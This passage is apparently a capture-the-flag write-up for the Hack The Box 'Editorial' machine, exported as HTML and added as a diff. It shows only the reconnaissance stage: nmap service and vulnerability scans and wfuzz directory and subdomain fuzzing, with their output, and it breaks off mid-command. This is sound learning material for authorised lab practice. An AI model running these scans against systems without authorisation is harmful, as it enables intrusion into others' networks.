@@ -1,0 +1,1063 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Editorial - 10.10.11.20</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="006db93b-2733-4dca-953f-36d28d629454" class="page sans"><header><h1 class="page-title"><strong>Editorial - 10.10.11.20</strong></h1><p class="page-description"></p></header><div class="page-body"><h1 id="52996d43-34ee-4bed-981f-02dd156fe0a8" class="">Information Gathering &amp; Enumeration</h1><p id="88189a5c-d2f1-436d-9723-6b657b00a78f" class="">
+</p><h2 id="9d054958-ff05-46ba-9384-ad509a0a9218" class="">Web</h2><p id="a1d12cb9-a71f-4d8d-a8a3-2d3416fca142" class="">Adding editorial.htb to /etc/hosts</p><figure id="52748b30-5df7-4eb7-ace7-0c3107a05983" class="image"><a href="../img/Editorial/Untitled.png"><img style="width:1920px" src="../img/Editorial/Untitled.png"/></a></figure><figure id="86606949-eec1-4a18-8ebf-16f7d52f9235" class="image"><a href="../img/Editorial/Untitled 1.png"><img style="width:708px" src="../img/Editorial/Untitled 1.png"/></a></figure><figure id="3643a6b6-482b-4b5b-812a-c15c2cef6c5e" class="image"><a href="../img/Editorial/Untitled 2.png"><img style="width:708px" src="../img/Editorial/Untitled 2.png"/></a></figure><p id="49cb233b-d1f6-4e3e-b2a8-34d8b6745022" class="">
+</p><h2 id="0478509f-2167-4600-afdb-ab9ea2b172fc" class="">NMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="443ddfde-4b8a-43af-b254-4ca614a29ccc" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ nmap -sVC -T5 -n 10.10.11.20
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-23 22:48 -05
+Warning: 10.10.11.20 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.11.20
+Host is up (0.10s latency).
+Not shown: 985 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
+|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
+80/tcp    open     http           nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://editorial.htb
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+106/tcp   filtered pop3pw
+1052/tcp  filtered ddt
+1063/tcp  filtered kyoceranetdev
+2126/tcp  filtered pktcable-cops
+2602/tcp  filtered ripd
+2717/tcp  filtered pn-requester
+3690/tcp  filtered svn
+6059/tcp  filtered X11:59
+6106/tcp  filtered isdninfo
+6123/tcp  filtered backup-express
+9000/tcp  filtered cslistener
+19350/tcp filtered unknown
+49161/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
+                                                                  </code></pre><p id="3a72ea9f-9396-43c1-ab62-a1eff1556870" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5cc1b9ac-6d1c-470f-9056-78bbdf9bf6f2" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ nmap --script vuln 10.10.11.20
+Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-23 22:48 -05
+Nmap scan report for editorial.htb (10.10.11.20)
+Host is up (0.10s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+| http-fileupload-exploiter: 
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|     Couldn&#x27;t find a file-type field.
+|   
+|_    Couldn&#x27;t find a file-type field.
+|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.
+|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=editorial.htb
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://editorial.htb:80/upload
+|     Form id: 
+|_    Form action: /upload
+
+Nmap done: 1 IP address (1 host up) scanned in 271.28 seconds
+                                   </code></pre><p id="7823dbae-657a-4724-93bf-156bf9c3af3d" class="">
+</p><h2 id="d62a27e8-4bc2-4c91-9d7e-fe619995bba4" class="">Directory Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a6775c0e-3daf-4d8f-bbb8-ac6fa59b975d" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://editorial.htb/FUZZ -t 50 --hc 404 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://editorial.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================                                     
+000000366:   200        209 L    537 W      7134 Ch     &quot;upload&quot;                                            
+000045240:   200        176 L    589 W      8562 Ch     &quot;http://editorial.htb/&quot;                             
+
+Total time: 0
+Processed Requests: 220560
+Filtered Requests: 220543
+Requests/sec.: 0
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="689adfc7-9948-441c-a17c-4c93fdac42b5" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$  wfuzz -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://editorial.htb/FUZZ -t 50 --hc 404  
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://editorial.htb/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000088:   200        209 L    537 W      7134 Ch     &quot;upload&quot;                                            
+000000126:   200        71 L     232 W      2938 Ch     &quot;about&quot;                                             
+000004255:   200        176 L    589 W      8562 Ch     &quot;http://editorial.htb/&quot;                             
+
+Total time: 0
+Processed Requests: 29949
+Filtered Requests: 29946
+Requests/sec.: 0
+
+ /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function
+                             </code></pre><p id="0a5912f0-14fc-44ce-b85f-2176ef67a2da" class="">
+</p><p id="b49f7316-0a18-428e-853e-721d79075766" class="">
+</p><h2 id="5c977316-676f-432a-b033-1727c8b2ee09" class="">DNS Enumeration</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37b305b8-cb74-4249-ba87-2f1e5348e585" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u &quot;http://editorial.htb/&quot; -H &quot;Host:FUZZ.editorial.htb&quot; -t 50 --hc 301 
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://editorial.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+
+Total time: 42.51680
+Processed Requests: 19966
+Filtered Requests: 19966
+Requests/sec.: 469.6025
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="811448f0-4182-42de-8b45-ca8a6d5657f4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u &quot;http://editorial.htb/&quot; -H &quot;Host:FUZZ.editorial.htb&quot; -t 50 --hc 301
